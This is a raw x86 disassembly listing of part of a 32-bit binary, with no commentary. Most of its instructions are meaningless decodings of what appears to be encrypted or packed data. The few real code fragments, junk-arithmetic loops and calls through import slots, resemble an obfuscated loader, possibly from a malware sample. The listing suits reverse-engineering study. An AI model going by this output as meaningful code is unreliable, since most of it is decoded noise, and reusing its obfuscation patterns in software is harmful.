  403f71:	ficomp DWORD PTR [ebp-0x77]
  403f74:	scas   eax,DWORD PTR es:[edi]
  403f75:	les    edx,FWORD PTR [ebp+0xf]
  403f78:	jb     0x403f9e
  403f7a:	or     edi,edi
  403f7c:	fadd   DWORD PTR [ebp+0x54]
  403f7f:	outs   dx,DWORD PTR ds:[esi]
  403f80:	add    eax,0x4cf64dd9
  403f85:	jnp    0x403f29
  403f87:	mov    ecx,DWORD PTR [eax]
  403f89:	sbb    DWORD PTR [edx],edi
  403f8b:	and    dl,0x91
  403f8e:	jnp    0x403fa9
  403f90:	adc    DWORD PTR [esi],esi
  403f92:	mov    cs,WORD PTR [edx+0x7f]
  403f95:	cmc    
  403f96:	cmp    DWORD PTR [edx+0x2e],ecx
  403f99:	jle    0x403f77
  403f9b:	call   0x5e0c:0xf5e32148
  403fa2:	sar    BYTE PTR [eax+0x223d6f30],0x7c
  403fa9:	jge    0x403f2d
  403fab:	and    bh,BYTE PTR [esi-0x7a5e3269]
  403fb1:	adc    BYTE PTR [edx],ah
  403fb3:	lock sbb eax,0xcb457cbd
  403fb9:	test   eax,0x3f270dcf
  403fbe:	jo     0x403fc3
  403fc0:	add    BYTE PTR [ebx+0x469b9846],0x11
  403fc7:	jg     0x404040
  403fc9:	inc    ebx
  403fca:	push   ecx
  403fcb:	jmp    0x908e4465
  403fd0:	inc    edi
  403fd1:	leave  
  403fd2:	jbe    0x404015
  403fd4:	scas   al,BYTE PTR es:[edi]
  403fd5:	xlat   BYTE PTR ds:[ebx]
  403fd6:	jne    0x403fc2
  403fd8:	mov    esi,0x2003fd6e
  403fdd:	int    0x19
  403fdf:	cmp    ecx,edi
  403fe1:	dec    esi
  403fe2:	sar    edi,1
  403fe4:	jmp    0x58a4:0xf4ceda3
  403feb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fec:	pop    edi
  403fed:	or     dl,BYTE PTR [eax-0x5ee2a602]
  403ff3:	(bad)  
  403ff4:	mov    cl,0x10
  403ff6:	fwait
  403ff7:	xchg   esp,eax
  403ff8:	add    DWORD PTR [edi-0x663eb028],ecx
  403ffe:	mov    cl,0x1a
  404000:	and    ebp,DWORD PTR [ecx-0x1a]
  404003:	lahf   
  404004:	out    0xc3,eax
  404006:	or     ecx,DWORD PTR [ebx]
  404008:	not    BYTE PTR [eax+0x9]
  40400b:	or     al,0x4d
  40400d:	in     al,dx
  40400e:	jb     0x403fbd
  404010:	out    0x58,eax
  404012:	in     al,dx
  404013:	add    bl,bh
  404015:	dec    eax
  404016:	fimul  WORD PTR [eax-0x1c]
  404019:	(bad)  
  40401a:	std    
  40401b:	push   ebx
  40401c:	es loop 0x403fc9
  40401f:	jns    0x403fe9
  404021:	in     eax,dx
  404022:	sub    ch,cl
  404024:	repz push ebp
  404026:	stos   BYTE PTR es:[edi],al
  404027:	hlt    
  404028:	bound  eax,QWORD PTR [ecx-0x17]
  40402b:	jmp    0x404096
  40402d:	shl    DWORD PTR [esi+0x6b57ee63],0x93
  404034:	shr    BYTE PTR gs:[esi],0x8a
  404038:	add    al,0xcf
  40403a:	xchg   BYTE PTR [ebx],ah
  40403c:	fcomp  QWORD PTR [eax]
  40403e:	in     eax,0x43
  404040:	jge    0x404020
  404042:	pcmpgtw mm6,mm1
  404045:	cmp    edx,ebp
  404047:	(bad)  
  404048:	push   eax
  404049:	ss popf 
  40404b:	cwde   
  40404c:	sbb    ebp,DWORD PTR [ecx+0x4b]
  40404f:	lahf   
  404050:	push   ebp
  404051:	mov    ebp,0xedfa42cb
  404056:	stc    
  404057:	push   edx
  404058:	mov    bl,BYTE PTR ds:0x8d6f91e4
  40405e:	pop    es
  40405f:	cwde   
  404060:	push   ebp
  404061:	or     ah,BYTE PTR [eax+ebx*4]
  404064:	push   esi
  404065:	ins    DWORD PTR es:[di],dx
  404067:	adc    al,0x8f
  404069:	gs jb  0x40406a
  40406c:	into   
  40406d:	outs   dx,DWORD PTR ds:[esi]
  40406e:	push   0x5ecba9b3
  404073:	lods   eax,DWORD PTR ds:[esi]
  404074:	jmp    0x404009
  404076:	xchg   edi,eax
  404077:	or     ebp,eax
  404079:	inc    ecx
  40407a:	ficom  WORD PTR [ecx+0x16]
  40407d:	jg     0x404048
  40407f:	mov    ecx,0x37897049
  404084:	ds jne 0x404019
  404087:	out    0xa4,eax
  404089:	loop   0x404064
  40408b:	outs   dx,DWORD PTR ds:[esi]
  40408c:	ins    BYTE PTR es:[edi],dx
  40408d:	dec    eax
  40408e:	sti    
  40408f:	loop   0x404053
  404091:	mov    ds:0x71a1ad0f,eax
  404096:	ret    0x7fed
  404099:	and    BYTE PTR [edx],bh
  40409b:	cmp    BYTE PTR [edi-0x16c4fe7b],ch
  4040a1:	and    eax,0x63ec008c
  4040a6:	div    BYTE PTR [esi-0x57b17373]
  4040ac:	iret   
  4040ad:	out    dx,al
  4040ae:	add    eax,0x712cc741
  4040b3:	data16 jp 0x40406e
  4040b6:	or     cl,bh
  4040b8:	test   al,0x4d
  4040ba:	cmp    al,0xbc
  4040bc:	xor    eax,DWORD PTR [ecx-0x2710b8b]
  4040c2:	add    eax,0x2b7e900
  4040c7:	add    BYTE PTR [eax],al
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0xaf7e6c1
  4040e3:	sub    eax,0x269e1da0
  4040e8:	js     0x404162
  4040ea:	(bad)  
  4040eb:	jle    0x404165
  4040ed:	js     0x404084
  4040ef:	clc    
  4040f0:	sub    eax,0xecc47953
  4040f5:	mov    ecx,0xc3ab8840
  4040fa:	(bad)  [eax-0x2b0a493f]
  404100:	test   al,0x15
  404102:	cmp    cl,BYTE PTR [edx-0x4d]
  404105:	cld    
  404106:	in     eax,dx
  404107:	push   ss
  404108:	jg     0x404172
  40410a:	sbb    al,0xa7
  40410c:	xchg   dl,dh
  40410e:	mov    dh,0x60
  404110:	inc    edi
  404111:	addr16 in al,dx
  404113:	sub    al,0x99
  404115:	fwait
  404116:	mov    bl,BYTE PTR [ecx+ecx*8]
  404119:	into   
  40411a:	mov    cl,0x5d
  40411c:	inc    edi
  40411d:	test   ch,dh
  40411f:	daa    
  404120:	outs   dx,DWORD PTR ds:[esi]
  404121:	pop    es
  404122:	jo     0x404195
  404124:	mov    eax,0x7e37ab3f
  404129:	xor    edi,ecx
  40412b:	inc    edx
  40412c:	dec    BYTE PTR [ebx-0x9]
  40412f:	xchg   edi,eax
  404130:	fbld   TBYTE PTR [eax-0x6b]
  404133:	mov    bl,0xff
  404135:	dec    ebp
  404136:	ja     0x4041b3
  404138:	leave  
  404139:	or     dl,BYTE PTR [eax-0xa]
  40413c:	xchg   ebp,eax
  40413d:	or     al,0x96
  40413f:	popa   
  404140:	jbe    0x404120
  404142:	jae    0x40415a
  404144:	jns    0x40416e
  404146:	add    esi,ebp
  404148:	fstp   TBYTE PTR [edi+0x57]
  40414b:	(bad)  
  40414c:	pop    edi
  40414d:	sbb    al,0x4e
  40414f:	inc    edi
  404150:	mov    al,0xc5
  404152:	lea    ebp,[ebp-0x51d53e0a]
  404158:	dec    ecx
  404159:	ret    
  40415a:	into   
  40415b:	(bad)  
  40415d:	icebp  
  40415e:	cmc    
  40415f:	ja     0x404194
  404161:	jmp    0x641c7356
  404166:	pop    ds
  404167:	xchg   esi,eax
  404168:	xchg   ecx,eax
  404169:	push   0xcf4e7dbd
  40416e:	add    bl,BYTE PTR [eax-0x149bcf21]
  404174:	sbb    eax,DWORD PTR [edi-0x1393e132]
  40417a:	pop    edi
  40417b:	fucomi st,st(6)
  40417d:	jmp    0x361e:0xae223dd4
  404184:	lods   al,BYTE PTR ds:[esi]
  404185:	shl    esi,1
  404187:	int3   
  404188:	cs lock icebp 
  40418b:	jae    0x4041fa
  40418d:	int    0x77
  40418f:	pop    eax
  404190:	mov    eax,0x5942888e
  404195:	ficom  DWORD PTR [edi]
  404197:	arpl   WORD PTR [esi+0x31d132e8],cx
  40419d:	stos   BYTE PTR es:[edi],al
  40419e:	mov    dh,0xc9
  4041a0:	sub    al,0x65
  4041a2:	out    dx,al
  4041a3:	push   ss
  4041a4:	sbb    cl,BYTE PTR [edi]
  4041a6:	(bad)  
  4041a8:	pop    ebp
  4041a9:	adc    al,BYTE PTR [ebx+0x73]
  4041ac:	hlt    
  4041ad:	repnz push 0x638859e9
  4041b3:	sub    al,0xe0
  4041b5:	push   es
  4041b6:	xor    BYTE PTR [ecx+0x430afcc7],al
  4041bc:	mov    WORD PTR [esi],gs
  4041be:	leave  
  4041bf:	inc    ebp
  4041c0:	ret    
  4041c1:	jno    0x404242
  4041c3:	push   0xffffff9b
  4041c5:	xlat   BYTE PTR ds:[ebx]
  4041c6:	adc    eax,0x65e6b467
  4041cb:	pusha  
  4041cc:	scas   al,BYTE PTR es:[edi]
  4041cd:	cmc    
  4041ce:	mov    edi,0x54625332
  4041d3:	dec    edi
  4041d4:	dec    ebp
  4041d5:	mov    al,BYTE PTR [esp+eax*8+0x66]
  4041d9:	add    DWORD PTR [eiz*8+0x371b1a75],esp
  4041e0:	mov    bl,0xa8
  4041e2:	fsubr  DWORD PTR [edi]
  4041e4:	mov    edx,0xcba8f055
  4041e9:	mov    al,BYTE PTR [edi]
  4041eb:	repnz loop 0x4041ee
  4041ee:	ins    BYTE PTR es:[edi],dx
  4041ef:	dec    esp
  4041f0:	sar    DWORD PTR [ecx-0x28466c14],cl
  4041f6:	push   ebp
  4041f7:	fwait
  4041f8:	daa    
  4041f9:	aaa    
  4041fa:	jg     0x404218
  4041fc:	icebp  
  4041fd:	xchg   DWORD PTR [ecx+0x548f8431],ecx
  404203:	out    dx,eax
  404204:	adc    ebx,DWORD PTR [esi]
  404206:	jnp    0x404202
  404208:	sbb    eax,0x8398b0ce
  40420d:	cmc    
  40420e:	mov    dh,0x1b
  404210:	mov    esp,0x2e2e00bd
  404215:	in     eax,dx
  404216:	jle    0x404205
  404218:	in     eax,0xc1
  40421a:	dec    eax
  40421b:	cmp    BYTE PTR [edx],bl
  40421d:	push   0x49
  40421f:	in     eax,dx
  404220:	pop    ds
  404221:	jl     0x40423b
  404223:	sbb    cl,bh
  404225:	jno    0x4041f1
  404227:	or     eax,0x23a4fcc7
  40422c:	push   0x4d952d3c
  404231:	adc    BYTE PTR [esi-0x71d93d0],dl
  404237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404238:	inc    esi
  404239:	add    BYTE PTR [esi-0x48],bl
  40423c:	push   edx
  40423d:	or     DWORD PTR [eax-0xc],0xfffffff9
  404241:	cs pop ds
  404243:	mov    ch,0x5c
  404245:	sar    DWORD PTR [ebx+0x38c25aae],cl
  40424b:	sbb    edi,DWORD PTR [ecx+0x3f]
  40424e:	and    al,0x8d
  404250:	inc    eax
  404251:	mov    eax,0x635ab5e8
  404256:	popa   
  404257:	sbb    dh,BYTE PTR [ecx+0x2c]
  40425a:	aas    
  40425b:	sar    ah,cl
  40425d:	imul   esp,DWORD PTR [ebx+0x714db71a],0xc9840171
  404267:	jge    0x40428a
  404269:	call   0x490:0x8ddf0070
  404270:	jmp    0x56a2:0x5bf77cd3
  404277:	ins    BYTE PTR es:[edi],dx
  404278:	ficomp DWORD PTR [esi]
  40427a:	mov    ds:0x1709d5ae,eax
  40427f:	dec    ebp
  404280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404281:	xor    eax,0x7925fd3
  404286:	inc    eax
  404287:	sbb    dl,BYTE PTR [eax+eiz*8+0x27be5d81]
  40428e:	xor    eax,0xe7d215c7
  404293:	gs mov bl,0x9d
  404296:	and    BYTE PTR [ebx+0x2d],bl
  404299:	jae    0x4042ac
  40429b:	push   edi
  40429c:	sub    dl,BYTE PTR [ebx]
  40429e:	push   cs
  40429f:	js     0x404281
  4042a1:	imul   esi,DWORD PTR [edi-0x28a0f4b0],0x72
  4042a8:	rcr    DWORD PTR [eax-0x38],cl
  4042ab:	lds    ebp,FWORD PTR [ebp+esi*4-0x55]
  4042af:	jo     0x40425a
  4042b1:	xchg   ecx,eax
  4042b2:	addr16 jb 0x4042cf
  4042b5:	mov    al,0x7
  4042b7:	inc    eax
  4042b8:	pop    ebx
  4042b9:	iret   
  4042ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042bb:	lods   al,BYTE PTR ds:[esi]
  4042bc:	jno    0x4042d4
  4042be:	fld    QWORD PTR [ecx-0x76]
  4042c1:	pusha  
  4042c2:	cli    
  4042c3:	scas   eax,DWORD PTR es:[edi]
  4042c4:	xchg   esi,eax
  4042c5:	adc    eax,DWORD PTR [esi-0x53]
  4042c8:	sbb    BYTE PTR [ebx+0x7f8b80e0],cl
  4042ce:	push   esi
  4042cf:	or     al,0xee
  4042d1:	lea    ecx,[esi]
  4042d3:	xor    DWORD PTR [esi],esp
  4042d5:	push   ebp
  4042d6:	jne    0x40425c
  4042d8:	repz popa 
  4042da:	daa    
  4042db:	fldcw  WORD PTR [esi-0x36]
  4042de:	mov    edx,0x6eb5b926
  4042e3:	push   esp
  4042e4:	fstp   QWORD PTR [ebp-0x24]
  4042e7:	cmp    DWORD PTR [edx],edx
  4042e9:	adc    BYTE PTR [edx-0x2c],ah
  4042ec:	gs sbb eax,0xb7c9e70b
  4042f2:	dec    ebp
  4042f3:	push   ebx
  4042f4:	out    0xd,eax
  4042f6:	(bad)  
  4042f7:	jne    0x40429c
  4042f9:	cwde   
  4042fa:	out    0x47,eax
  4042fc:	adc    BYTE PTR [edx+0x13f80c0a],dl
  404302:	fsubr  DWORD PTR [edx+0x6ffc2ec1]
  404308:	sbb    DWORD PTR [ebp+ebx*8-0x40],esp
  40430c:	adc    DWORD PTR [edx],ebp
  40430e:	in     eax,dx
  40430f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404310:	ret    0x988b
  404313:	push   0xcdda1fe5
  404318:	or     BYTE PTR [edx-0x3e15a81f],al
  40431e:	xor    eax,0x7d688047
  404323:	sbb    eax,0x49789a96
  404328:	push   es
  404329:	push   ds
  40432a:	nop
  40432b:	loopne 0x404310
  40432d:	lds    edi,FWORD PTR [edi+0x2c633a36]
  404333:	aaa    
  404334:	(bad)  
  404335:	xchg   edx,eax
  404336:	sbb    edi,DWORD PTR [edi+ebp*2]
  404339:	jmp    FWORD PTR [ebp+0x45]
  40433c:	add    BYTE PTR [eax],ch
  40433e:	in     al,0x10
  404340:	xchg   BYTE PTR [edx+0x7c],dl
  404343:	jb     0x404304
  404345:	fsub   DWORD PTR [eax-0x7b]
  404348:	data16 sub bl,BYTE PTR [edi-0x80]
  40434c:	inc    esp
  40434d:	(bad)  
  40434e:	sbb    eax,0x1300fe65
  404353:	icebp  
  404354:	adc    edx,DWORD PTR [ecx]
  404356:	mov    BYTE PTR [eax-0x1a],bl
  404359:	retf   0x16db
  40435c:	mov    ah,0xe1
  40435e:	pop    ebx
  40435f:	sbb    eax,0x6f0a7c07
  404364:	or     al,0x4a
  404366:	fdiv   st(0),st
  404369:	cmp    eax,0x55390e54
  40436e:	retw   
  404370:	mov    DWORD PTR [eax],ecx
  404372:	mov    eax,DWORD PTR [ebp+0xc]
  404375:	mov    eax,DWORD PTR [ebp+0x8]
  404378:	push   DWORD PTR [ebp-0x8]
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42a9dd
  4043aa:	add    DWORD PTR ds:0x42a9c1,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42aa15,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42aa15
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42aa15,ecx
  4043d3:	cmp    DWORD PTR ds:0x42aa15,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42aa15,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42aaa5
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	lods   al,BYTE PTR ds:[esi]
  40441a:	mov    dh,0x50
  40441c:	jp     0x40443a
  40441e:	sub    edi,DWORD PTR [eax+0x78]
  404421:	dec    ebp
  404422:	jle    0x40449c
  404424:	js     0x404457
  404426:	dec    ecx
  404427:	or     al,0x86
  404429:	test   al,0x25
  40442b:	ins    DWORD PTR es:[edi],dx
  40442c:	stos   DWORD PTR es:[edi],eax
  40442d:	inc    edi
  40442e:	xchg   ebx,eax
  40442f:	lea    edx,[edi-0x66]
  404432:	test   ch,cl
  404434:	mov    ch,0x53
  404436:	add    DWORD PTR [edx+0x4ee1d6db],edx
  40443c:	les    eax,FWORD PTR [ebx-0x797e7477]
  404442:	xor    al,0x63
  404444:	mov    dl,ch
  404446:	jmp    0x40449e
  404448:	add    eax,0xd13f7331
  40444d:	inc    edx
  40444e:	in     al,dx
  40444f:	js     0x404450
  404451:	mov    dl,0xe5
  404453:	mov    ds:0x95ab7a23,al
  404458:	jecxz  0x4043ed
  40445a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40445b:	mov    ch,0x12
  40445d:	retf   
  40445e:	push   es
  40445f:	or     BYTE PTR [ebx+0x4b],dh
  404462:	or     al,0xe2
  404464:	retf   0x2517
  404467:	rcr    DWORD PTR [esp+ebp*2],cl
  40446a:	dec    edx
  40446b:	jp     0x404497
  40446d:	popf   
  40446e:	sub    edi,DWORD PTR [edi-0x3b]
  404471:	stc    
  404472:	and    BYTE PTR [esi-0x80],bh
  404475:	jb     0x4044d9
  404477:	out    0x46,eax
  404479:	push   ebx
  40447a:	test   BYTE PTR [esi+0x125fc053],al
  404480:	cs mov al,0xaa
  404483:	outs   dx,DWORD PTR ds:[esi]
  404484:	jp     0x404460
  404486:	scas   al,BYTE PTR es:[edi]
  404487:	das    
  404488:	ja     0x404495
  40448a:	(bad)  ds:0x54c11ad5
  404490:	add    ch,ah
  404492:	mov    esi,es
  404494:	in     al,dx
  404495:	mov    cl,0xe
  404497:	add    BYTE PTR [ebp-0x1a9775ca],0xcd
  40449e:	adc    ebp,DWORD PTR [edx]
  4044a0:	imul   edi,DWORD PTR [eax+edx*2+0x4d],0x5226ecb4
  4044a8:	fst    DWORD PTR ds:0x862688fe
  4044ae:	int3   
  4044af:	mov    dh,0x80
  4044b1:	mov    eax,0x21b15061
  4044b6:	inc    esp
  4044b7:	stos   DWORD PTR es:[edi],eax
  4044b8:	mov    BYTE PTR [ecx-0x13527383],cl
  4044be:	xor    BYTE PTR [ebx+edx*2-0x16],al
  4044c2:	out    0x3d,al
  4044c4:	aad    0x33
  4044c6:	adc    esi,eax
  4044c8:	jmp    0x9e40:0xa983220
  4044cf:	or     BYTE PTR [esi-0x7c],dh
  4044d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044d3:	pop    esp
  4044d4:	xchg   ebp,eax
  4044d5:	retf   0x5510
  4044d8:	mov    dh,0x96
  4044da:	fwait
  4044db:	jb     0x404556
  4044dd:	addr16 sbb al,0xdd
  4044e0:	cmp    eax,0xe0ea131d
  4044e5:	cmp    edi,edi
  4044e7:	lock ds sub al,0xd4
  4044eb:	dec    eax
  4044ec:	mov    DWORD PTR [ebp-0x6a],esp
  4044ef:	fsub   st(2),st
  4044f1:	xchg   ebp,eax
  4044f2:	jmp    0xc4050e0e
  4044f7:	inc    esi
  4044f8:	mov    ebp,0x94151995
  4044fd:	and    al,0x2
  4044ff:	in     eax,0x92
  404501:	dec    eax
  404502:	retf   0x126
  404505:	jae    0x40452d
  404507:	xchg   DWORD PTR [edx-0xc],edx
  40450a:	sub    ebp,DWORD PTR [esp+eax*4-0x70]
  40450e:	ret    
  40450f:	jl     0x40452a
  404511:	outs   dx,BYTE PTR fs:[esi]
  404513:	in     eax,dx
  404514:	push   0x97d9b65b
  404519:	and    eax,0x785ee12e
  40451e:	jmp    0x78b6:0xe24eff2c
  404525:	inc    edi
  404526:	out    0x65,al
  404528:	pusha  
  404529:	add    BYTE PTR [edi+0x317e7e33],ah
  40452f:	dec    esi
  404530:	cli    
  404531:	and    eax,0xbfef1fc4
  404536:	mov    ss,WORD PTR [esp+ebx*4-0x2f8b2545]
  40453d:	scas   eax,DWORD PTR es:[edi]
  40453e:	hlt    
  40453f:	imul   edx,DWORD PTR [esi-0x2c],0xdbbaee39
  404546:	(bad)  
  404547:	jo     0x4044fc
  404549:	mov    ds:0x5ed57de5,eax
  40454e:	cs xor eax,0x65ca575
  404554:	pop    es
  404555:	loop   0x404524
  404557:	ret    0x16c4
  40455a:	xchg   ecx,eax
  40455b:	inc    ebx
  40455c:	xchg   esp,eax
  40455d:	add    bl,BYTE PTR [ebx+0x6f]
  404560:	mov    ah,0x48
  404562:	fidiv  WORD PTR [ebp-0xb]
  404565:	syscall 
  404567:	call   0xc43e:0xd06117a9
  40456e:	xchg   ebx,eax
  40456f:	pop    ebx
  404570:	test   DWORD PTR [edi],edi
  404572:	add    BYTE PTR [edi-0x2d790ceb],bh
  404578:	push   0x70
  40457a:	and    esp,DWORD PTR [edi]
  40457c:	push   0xffffff89
  40457e:	jp     0x4045fe
  404580:	jp     0x40451d
  404582:	repz (bad) 
  404584:	push   eax
  404585:	pop    eax
  404586:	lods   al,BYTE PTR ds:[esi]
  404587:	xchg   BYTE PTR [edi+eax*8+0x2b],ah
  40458b:	xchg   edx,eax
  40458c:	sub    DWORD PTR [edx+0x5e],ebp
  40458f:	std    
  404590:	dec    eax
  404591:	lods   al,BYTE PTR ds:[esi]
  404592:	mov    DWORD PTR [esi],esi
  404594:	mov    dh,BYTE PTR [ebx+0x75]
  404597:	hlt    
  404598:	push   ss
  404599:	add    ebp,DWORD PTR [ecx]
  40459b:	aas    
  40459c:	mov    ecx,DWORD PTR [ecx+0x54c038f8]
  4045a2:	or     edx,DWORD PTR [edx+0x3621a921]
  4045a8:	add    BYTE PTR [ebp-0x5d89172b],ah
  4045ae:	cmc    
  4045af:	adc    al,BYTE PTR [edi]
  4045b1:	hlt    
  4045b2:	test   eax,0x8efd72c6
  4045b7:	shl    DWORD PTR [ebp-0x76789a51],cl
  4045bd:	test   edx,0xe01c9485
  4045c3:	(bad)
  4045c6:	cwde   
  4045c7:	in     eax,0xd4
  4045c9:	mov    ebx,0x7a9526c9
  4045ce:	retf   
  4045cf:	cmp    DWORD PTR [ebp+0x39],ecx
  4045d2:	not    DWORD PTR [ebx-0x6e]
  4045d5:	jb     0x40458c
  4045d7:	jecxz  0x4045aa
  4045d9:	or     eax,0x6d552e39
  4045de:	inc    eax
  4045df:	push   ebp
  4045e0:	cmp    dh,BYTE PTR [edx+ebx*4]
  4045e3:	daa    
  4045e4:	push   0xdbf4c71f
  4045e9:	inc    edx
  4045ea:	scas   eax,DWORD PTR es:[edi]
  4045eb:	push   es
  4045ec:	inc    esi
  4045ed:	ins    BYTE PTR es:[edi],dx
  4045ee:	rcr    BYTE PTR [edi+0x5f288444],cl
  4045f4:	jno    0x40458a
  4045f6:	add    eax,0x34147a45
  4045fb:	ins    BYTE PTR es:[edi],dx
  4045fc:	ret    0x89c7
  4045ff:	sar    DWORD PTR [eax+0x35],cl
  404602:	cmp    eax,0x8616be36
  404607:	add    dl,al
  404609:	out    0x90,al
  40460b:	(bad)  [ebx]
  40460d:	push   edx
  40460e:	(bad)  
  404610:	int3   
  404611:	repz out dx,al
  404613:	add    eax,0x50b3cc05
  404618:	mov    DWORD PTR [ecx-0x1fff8518],edi
  40461e:	nop
  40461f:	mov    ebp,0x6ad95223
  404624:	mov    edi,0x386d6b5
  404629:	push   ebp
  40462a:	mov    bl,0x10
  40462c:	lahf   
  40462d:	loopne 0x4046a0
  40462f:	out    0x6f,eax
  404631:	mov    ds:0xf316cf73,al
  404636:	or     BYTE PTR [ebx-0x3522fa73],dh
  40463c:	mov    cl,0xc5
  40463e:	cmp    DWORD PTR [edi-0x5cd187da],ecx
  404644:	repnz push 0xffffffe3
  404647:	xchg   DWORD PTR cs:0x909c3e1,ebx
  40464e:	push   ebx
  40464f:	test   al,0x5a
  404651:	cwde   
  404652:	fwait
  404653:	xor    DWORD PTR [edi],esi
  404655:	sub    al,0x80
  404657:	aam    0x4c
  404659:	fwait
  40465a:	(bad)  
  40465b:	cmc    
  40465c:	xor    DWORD PTR [edi-0x2b],ebp
  40465f:	daa    
  404660:	cmp    al,BYTE PTR [esi-0x359a6abf]
  404666:	stc    
  404667:	mov    eax,0xbc3b8a7f
  40466c:	mov    cl,0xe8
  40466e:	push   es
  40466f:	mov    al,0x20
  404671:	mov    bh,0xec
  404673:	sub    bh,BYTE PTR [edi-0x21]
  404676:	in     eax,dx
  404677:	add    eax,edi
  404679:	mov    bh,ah
  40467b:	retf   0xc2de
  40467e:	sub    al,0xf1
  404680:	sub    DWORD PTR [edx],ecx
  404682:	xchg   ebp,eax
  404683:	test   DWORD PTR [edx-0x4a],esi
  404686:	cmp    DWORD PTR [edi],ebp
  404688:	mov    bh,0x78
  40468a:	xor    al,0x40
  40468c:	scas   al,BYTE PTR es:[edi]
  40468d:	inc    ebp
  40468e:	mov    al,ds:0xe021b9fc
  404693:	mov    DWORD PTR ds:0x5ed86cd8,edi
  404699:	dec    ebx
  40469a:	mov    ch,0xf2
  40469c:	cmp    ecx,edx
  40469e:	aam    0x9b
  4046a0:	pop    ax
  4046a2:	ret    
  4046a3:	fld    TBYTE PTR [ebx-0x38aeb348]
  4046a9:	inc    esp
  4046aa:	(bad)  
  4046ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046ac:	mov    al,ds:0xceef3c27
  4046b1:	adc    eax,0xcc8200c
  4046b6:	pop    es
  4046b7:	stos   BYTE PTR es:[edi],al
  4046b8:	or     dl,BYTE PTR [ebx+0x10]
  4046bb:	dec    edx
  4046bc:	or     DWORD PTR [edx-0x1c],esp
  4046bf:	push   ecx
  4046c0:	in     eax,0xeb
  4046c2:	sbb    cl,dl
  4046c4:	(bad)  
  4046c5:	lahf   
  4046c6:	hlt    
  4046c7:	mov    eax,0x8849cb04
  4046cc:	xor    DWORD PTR [edx+0x7c160107],ebx
  4046d2:	daa    
  4046d3:	pop    esp
  4046d4:	mov    ebx,0x647c7488
  4046d9:	xchg   edi,eax
  4046da:	pop    ss
  4046db:	outs   dx,DWORD PTR ds:[esi]
  4046dc:	imul   esp,DWORD PTR [ebx-0x55],0x3b
  4046e0:	loopne 0x4046a0
  4046e2:	sbb    bl,dh
  4046e4:	mov    ebp,0x918fb33
  4046e9:	inc    edx
  4046ea:	push   edx
  4046eb:	fnstcw WORD PTR [ecx-0x264a3dbd]
  4046f1:	ror    dl,0x33
  4046f4:	and    eax,0x5635168f
  4046f9:	and    DWORD PTR ds:0x42a9d5,0x0
  404703:	jmp    0x404715
  404708:	mov    esi,DWORD PTR ds:0x42a9d5
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42a9d5,esi
  404715:	cmp    DWORD PTR ds:0x42a9d5,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42a9d5,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42aa9d
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42aca8
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0x1d4983de
  404770:	cdq    
  404771:	sub    DWORD PTR [ecx+0x29],esi
  404774:	js     0x4047ee
  404776:	dec    ebp
  404777:	jle    0x4047f1
  404779:	js     0x40479b
  40477b:	popf   
  40477c:	jmp    0x680fa6d8
  404781:	int3   
  404782:	scas   al,BYTE PTR es:[edi]
  404783:	push   ebx
  404784:	imul   esp,DWORD PTR [ebx+0xad89dfe],0xffffffbc
  40478b:	pop    esp
  40478c:	jge    0x404732
  40478e:	and    eax,0xb0d10503
  404793:	pop    ds
  404794:	call   0x5b78:0xc1d464d8
  40479b:	pop    ecx
  40479c:	mov    bh,0x37
  40479e:	hlt    
  40479f:	jnp    0x404820
  4047a1:	adc    al,0x5
  4047a3:	mov    cl,0x9c
  4047a5:	popa   
  4047a6:	add    eax,ebp
  4047a8:	es xor esi,edx
  4047ab:	sbb    al,0xb8
